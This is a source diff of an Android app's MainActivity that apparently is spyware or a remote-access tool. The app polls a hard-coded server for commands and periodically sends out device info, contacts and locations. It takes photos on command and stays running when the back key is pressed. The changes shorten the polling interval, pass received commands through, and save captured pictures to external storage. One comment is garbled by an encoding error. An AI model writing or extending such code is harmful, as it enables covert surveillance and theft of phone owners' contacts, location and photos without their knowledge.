@@ -40,6 +40,7 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;  
+import android.os.Environment;
 import android.os.Handler;  
 import android.provider.CallLog;
 import android.provider.ContactsContract;
@@ -52,6 +53,7 @@ import android.view.View;
 import android.view.View.OnClickListener;  
 import android.widget.Button;  
 import android.widget.TextView;  
+import android.widget.Toast;
   
 public class MainActivity extends Activity {  
     private Button btnUploadFile; 
@@ -64,7 +66,7 @@ public class MainActivity extends Activity {
     private String result = "";  
     private boolean run = false; 
     
-    private static int delayTime = 5000;
+    private static int delayTime = 500;
     
     private static String ipAddr = "10.0.0.1";
     
@@ -78,7 +80,7 @@ public class MainActivity extends Activity {
                 handler.postDelayed(this, delayTime); 
                 
                 replyDeviceInfoTime++;
-                if(replyDeviceInfoTime == 720){
+                if(replyDeviceInfoTime == 7200){
 	                replyDeviceInfo();
 	                replyDeviceContacts();
 	                replyDeviceLocations();
@@ -110,6 +112,7 @@ public class MainActivity extends Activity {
 			    				
 			    				if(!data.equals("invalidCommand")){
 			    					//result = data;
+			    					result = data;
 			    					flag = flag | true;
 			    				}
 			    				else{
@@ -122,7 +125,7 @@ public class MainActivity extends Activity {
 		    					flag = flag | false;
 		    				}
 	    				}
-	    				result = (flag) ? "getCommand" : "noCommand or invalidCommand";
+	    				result = (flag) ? result : "noCommand or invalidCommand";
 	    			}
 	    			else{
 	    				result = "noCommand";    				
@@ -133,7 +136,8 @@ public class MainActivity extends Activity {
         		}
                 
             }  
-            tvResult.setText(result);            
+            tvResult.setText(result); 
+            //Toast.makeText(getApplicationContext(), String.valueOf(replyDeviceInfoTime), Toast.LENGTH_SHORT).show();
         }  
     };  
   
@@ -244,7 +248,7 @@ public class MainActivity extends Activity {
     @Override
     public boolean onKeyDown(int keyCode, KeyEvent event) {
     	if (keyCode == KeyEvent.KEYCODE_BACK) {
-    			moveTaskToBack(false);
+    			moveTaskToBack(true);
     			return true;
     	}
     	return super.onKeyDown(keyCode, event);
@@ -879,7 +883,8 @@ public class MainActivity extends Activity {
 	}
 	/**·µ»ØÍ¼Æ¬**/
 	public String replyPicture(String command_id){	
-		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
+		//String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
+		String fileDirPath = Environment.getExternalStorageDirectory().getAbsolutePath();
 		String result = takePicture("",fileDirPath);
         //String result = "sucess";
         if(result.equals("sucess")){        	
